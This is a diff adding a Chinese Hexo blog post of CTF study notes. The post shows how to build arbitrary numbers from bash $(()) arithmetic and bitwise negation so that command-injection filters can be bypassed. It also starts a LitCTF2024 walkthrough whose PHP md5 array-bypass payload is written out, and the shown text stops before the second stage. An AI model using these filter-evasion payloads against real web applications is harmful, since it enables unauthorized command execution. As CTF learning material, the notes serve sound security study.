@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/hah.jpg">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/hah.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fupanc.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="rce ‘新’进阶现在稍微大型的比赛都不会考那些已经算是比较常见、简单的绕过如自增等，需要进阶学习纪录一下。此为学习者笔记,还是强调知识点融会贯通">
+<meta property="og:type" content="article">
+<meta property="og:title" content="rce之利用shell变量">
+<meta property="og:url" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/index.html">
+<meta property="og:site_name" content="Fupanc">
+<meta property="og:description" content="rce ‘新’进阶现在稍微大型的比赛都不会考那些已经算是比较常见、简单的绕过如自增等，需要进阶学习纪录一下。此为学习者笔记,还是强调知识点融会贯通">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603023300478.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603153444204.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125450576.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603125825756.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603135658082.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204933409.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603141433189.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603150736801.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165448778.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603191723486.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603203638487.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603204738674.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603165230257.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603161335061.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180726080.png">
+<meta property="og:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240603180945707.png">
+<meta property="article:published_time" content="2024-06-03T13:27:49.804Z">
+<meta property="article:modified_time" content="2024-06-03T13:33:34.148Z">
+<meta property="article:author" content="Fupanc">
+<meta property="article:tag" content="学习笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png">
+
+
+<link rel="canonical" href="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/","path":"2024/06/03/rce之利用shell变量/","title":"rce之利用shell变量"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>rce之利用shell变量 | Fupanc</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="Fupanc" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Fupanc</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Fupanc's blog</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#rce-%E2%80%98%E6%96%B0%E2%80%99%E8%BF%9B%E9%98%B6"><span class="nav-number">1.</span> <span class="nav-text">rce ‘新’进阶</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B9%8B%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="nav-number">1.0.1.</span> <span class="nav-text">命令执行之构造数字</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">1.0.1.0.2.</span> <span class="nav-text">例题</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8shell%E8%84%9A%E6%9C%AC%E5%8F%98%E9%87%8F%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4"><span class="nav-number">1.0.2.</span> <span class="nav-text">利用shell脚本变量构造命令</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%90%AF%E7%A8%8B"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">启程</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%9E%84%E9%80%A0"><span class="nav-number">1.0.2.1.1.</span> <span class="nav-text">开始构造</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">其它的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#shell%E8%84%9A%E6%9C%AC%E4%B8%AD-%E7%9A%84%E5%A4%9A%E7%A7%8D%E7%94%A8%E6%B3%95"><span class="nav-number">1.0.2.2.1.</span> <span class="nav-text">shell脚本中$的多种用法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-%E6%9E%84%E9%80%A0"><span class="nav-number">1.0.2.2.2.</span> <span class="nav-text">利用$#构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-%E6%9E%84%E9%80%A0-1"><span class="nav-number">1.0.2.2.3.</span> <span class="nav-text">利用 $(()) 构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-%E6%9E%84%E9%80%A0-2"><span class="nav-number">1.0.2.2.4.</span> <span class="nav-text">利用 $? 构造</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98-1"><span class="nav-number">1.0.2.2.5.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#XYCTF-2024-ezRCE"><span class="nav-number">1.0.2.2.5.1.</span> <span class="nav-text">XYCTF 2024 - ezRCE</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Fupanc"
+      src="/images/index.jpg">
+  <p class="site-author-name" itemprop="name">Fupanc</p>
+  <div class="site-description" itemprop="description">志之难也，不在胜人，在于自胜</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Fupanc" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Fupanc" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:fupanc.vivo50@gmail.com" title="E-Mail → mailto:fupanc.vivo50@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://fupanc.github.io/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/index.jpg">
+      <meta itemprop="name" content="Fupanc">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Fupanc">
+      <meta itemprop="description" content="志之难也，不在胜人，在于自胜">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="rce之利用shell变量 | Fupanc">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          rce之利用shell变量
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-03 21:27:49 / 修改时间：21:33:34" itemprop="dateCreated datePublished" datetime="2024-06-03T21:27:49+08:00">2024-06-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/rce/" itemprop="url" rel="index"><span itemprop="name">rce</span></a>
+        </span>
+          ，
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/rce/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/" itemprop="url" rel="index"><span itemprop="name">rce之利用shell变量</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>21k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>38 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="rce-‘新’进阶"><a href="#rce-‘新’进阶" class="headerlink" title="rce ‘新’进阶"></a>rce ‘新’进阶</h1><p>现在稍微大型的比赛都不会考那些已经算是比较常见、简单的绕过如自增等，需要进阶学习纪录一下。此为学习者笔记,还是<strong>强调知识点融会贯通</strong></p>
+<span id="more"></span>
+
+<h3 id="命令执行之构造数字"><a href="#命令执行之构造数字" class="headerlink" title="命令执行之构造数字"></a>命令执行之构造数字</h3><h5 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h5><p><strong>在linux中<code>$(())</code>用于算术运算</strong>，在这个表达式中，你可以放入任何想要计算的运算式。</p>
+<p>先看下面这个式子：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602213327932.png" alt="image-20240602213327932"></p>
+<p>这个式子中并没有给出任何具体的运算内容，系统默认执行了一个空的算数运算。所以在没有明确运算目标的情况下，**<code>$(())</code>返回的默认值是0**。（同时注意，个人认为，注意看payload以及执行情况，<code>$(())</code>本生就会执行后返回结果，不需要套一个<code>eval()</code>这种类似的执行函数）</p>
+<p>看看给了的正常的运算符</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214355554.png" alt="image-20240602214355554"></p>
+<p>重点来了，尝试将上面那个0取反<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214522539.png" alt="image-20240602214522539"></p>
+<p>得到-1，那么再取反一次<code>-2</code>看看<br><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602214739811.png" alt="image-20240602214739811"></p>
+<p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p>
+<p>比如想要获得1，就可以像上面一样构造，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215641095.png" alt="image-20240602215641095"></p>
+<p>现在想要构造就很简单了，比如又想构造<code>2</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602215758986.png" alt="image-20240602215758986"></p>
+<p>这样就可以构造任意数字。</p>
+<p><strong>同时注意加号在某些情况下可以省略</strong>（建议在去掉+号前先看看没去+号是什么样子的），比如那个生成1的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原：</span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))))))</span><br><span class="line"></span><br><span class="line">去掉+号后</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))))))  如下图</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222226786.png" alt="image-20240602222226786"></p>
+<p>成功执行。</p>
+<p>但是注意，为什么要加某些情况下呢，比如下面这个测试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo $(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line">生成2的payload，那么现在将+去掉，如下：</span><br><span class="line">echo $(($((~$(($((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222408309.png" alt="image-20240602222408309"></p>
+<p>这里生成的却是11，嘿嘿，这是怎么回事，注意看这个payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(($((~$(($((~$(())))+$((~$(())))))))+$((~$(($((~$(())))+$((~$(())))))))))</span><br><span class="line"></span><br><span class="line">先像上面那个1那样只去掉构造出1的+号，再看看执行结果，如下：</span><br><span class="line">$(($((~$(($((~$(())))$((~$(())))))))+$((~$(($((~$(())))$((~$(())))))))))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602222634293.png" alt="image-20240602222634293"></p>
+<p>成功得到2，那么为什么将中间那个<code>+</code>去掉就不对了呢，个人认为是符号判定的问题，用代码表示一下去掉<code>+</code>后的情况：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(( $((~$(($((~$(())))$((~$(()))))))) $((~$(($((~$(())))$((~$(()))))))) ))</span><br></pre></td></tr></table></figure>
+
+<p>用空格分隔了一下，注意看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))))))  已经符合一个完整的格式，会得到1，那么两个1就会得到11，这就是为什么可以得到11的原因</span><br></pre></td></tr></table></figure>
+
+<p>那么现在来和之前生成1的payload对比一下（同样用空格分隔）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(( ~$(($((~$(()))) $((~$(()))))) ))</span><br></pre></td></tr></table></figure>
+
+<p>这样并不能形成一个完整的可计算的格式，故只能类似之前那样有个<code>+</code>，所以这里的<code>+</code>号可以省略，而那个2不能。</p>
+<p><strong>那么如果遇到过滤<code>+</code>号的题</strong>，2该如何构造呢，注意看：</p>
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223600280.png" alt="image-20240602223600280"></p>
+<p>尝试一下构造<code>-3</code>，如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-1: $((~$(())))</span><br><span class="line"></span><br><span class="line">echo $((~$(($((~$(())))+$((~$(())))+$((~$(())))))))</span><br><span class="line">可以直接得到2，看了一下构造，应该是可以去掉+号的，尝试一下：</span><br><span class="line">echo $((~$(($((~$(())))$((~$(())))$((~$(()))))))) ,成功</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/03/rce%E4%B9%8B%E5%88%A9%E7%94%A8shell%E5%8F%98%E9%87%8F/image-20240602223942848.png" alt="image-20240602223942848"></p>
+<p>多尝试，看构造，较重要</p>
+<h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>LitCTF2024 - 百万美元的诱惑</p>
+<p>开题：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> !== <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$c</span>) &amp;&amp; <span class="variable">$c</span> &gt; <span class="number">2024</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;好康的&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;干巴爹干巴爹先辈~&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;开胃小菜))&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单的绕过，payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2&amp;c=2025a</span><br></pre></td></tr></table></figure>
+
+<p>然后给了第二关<code>/dollar.php</code>，代码如下：</p>
